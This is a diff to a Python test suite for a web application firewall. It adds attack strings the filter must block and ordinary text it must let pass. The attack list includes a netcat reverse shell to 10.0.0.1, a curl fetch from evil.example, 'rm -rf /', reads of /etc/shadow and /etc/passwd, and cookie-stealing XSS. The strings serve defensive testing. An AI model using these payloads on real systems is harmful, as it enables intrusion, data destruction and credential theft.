@@ -24,6 +24,20 @@ ATTACKS = [
     ("cmd_injection", "catalog.pdf; cat /etc/hosts"),
     ("cmd_injection", "x && whoami"),
     ("cmd_injection", "$(curl http://evil.example/x.sh)"),
+    # More real variants, so tightening the rules against false alarms cannot quietly drop coverage.
+    ("sqli", "' OR 1=1#"),
+    ("sqli", "1); DROP TABLE orders;--"),
+    ("sqli", "1 UNION ALL SELECT NULL,NULL--"),
+    ("sqli", "test' OR 'a'='a"),
+    ("sqli", "'; WAITFOR DELAY '0:0:5'--"),
+    ("xss", "<svg onload=alert(1)>"),
+    ("xss", "<body onload=alert(document.cookie)>"),
+    ("xss", "<iframe src=//evil.example></iframe>"),
+    ("path_traversal", "../../../../etc/shadow"),
+    ("path_traversal", "/proc/self/environ"),
+    ("cmd_injection", "file.txt; rm -rf /"),
+    ("cmd_injection", "| nc -e /bin/sh 10.0.0.1 4444"),
+    ("cmd_injection", "`cat /etc/passwd`"),
 ]
 
 BENIGN = [
@@ -40,6 +54,38 @@ BENIGN = [
     "こんにちは！配送について質問です。明日届きますか？",
     "Tom & Jerry",
     "50% off",
+    # Ordinary messages, names and notes that used to be mistaken for attacks.
+    "明日の10時に予約したいです",
+    "注文をキャンセルしたい。番号は #12345 です",
+    "送料はいくらですか？色違い（赤・青）はありますか",
+    "山田 太郎／やまだ たろう",
+    "Thanks; update me when it ships",
+    "Done; create an account later please",
+    "My pets: dog; cat and fish",
+    "I need more sleep (8 hours a day)",
+    "benchmark (results) look great",
+    "He said \"#1 in Japan\"",
+    "Rated '#1' by customers",
+    "room 12; rm 3 is free",
+    "Mary's order; id 4521",
+    "select the blue one and insert your name here",
+    "The update is ready; download it",
+    # Code snippets and tech notes a developer site may receive.
+    "JavaScript: The Good Parts",
+    "I love JavaScript: it is great",
+    "Use `npm install` then `git status`",
+    "$(document).ready is old jQuery",
+    "The cost is $(10) per month",
+    "running python3 scripts and bash tutorials",
+    "a = b && c, or x || y",
+    "the document.title changed after load",
+    "<h1>Welcome</h1> and <p>hello</p>",
+    "a > b and c < d",
+    "price < 1000 and size > 10",
+    "see ./docs and ../guide.md for details",
+    "/etc is a folder; config lives there",
+    "union of two sets; SELECT appears in SQL",
+    "<b>bold</b> <br> <3 thanks",
 ]
 
 
@@ -87,3 +133,28 @@ def test_crafted_long_input_stays_fast(crafted):
     started = time.perf_counter()
     waf.inspect_value("query:q", crafted)
     assert time.perf_counter() - started < 0.5
+
+
+# --- Not attacks: a single weak signal, which also shows up in ordinary text, must pass.
+
+def test_a_lone_weak_signal_is_not_an_attack():
+    # document.cookie in a note, or a bare sleep()/benchmark() — one weak signal only.
+    assert waf.inspect_value("query:q", "the document.cookie value is handy for debugging") is None
+    assert waf.inspect_value("query:q", "call sleep(30) to wait") is None
+
+
+def test_two_weak_signals_together_are_blocked():
+    # sleep() used for timing AND a cookie-grab reference: two weak signals reach the threshold.
+    d = waf.inspect_value("query:q", "benchmark(1000) then read document.cookie")
+    assert d is not None
+
+
+def test_normal_sql_like_words_do_not_trigger():
+    for value in ["please update my address", "create an account", "delete the old photo",
+                  "select your size", "drop by anytime", "insert the coin"]:
+        assert waf.inspect_value("query:q", value) is None, value
+
+
+def test_inline_code_snippets_are_not_commands():
+    for value in ["run `npm install`", "use `git status`", "$(document).ready", "cost is $(5)"]:
+        assert waf.inspect_value("query:q", value) is None, value
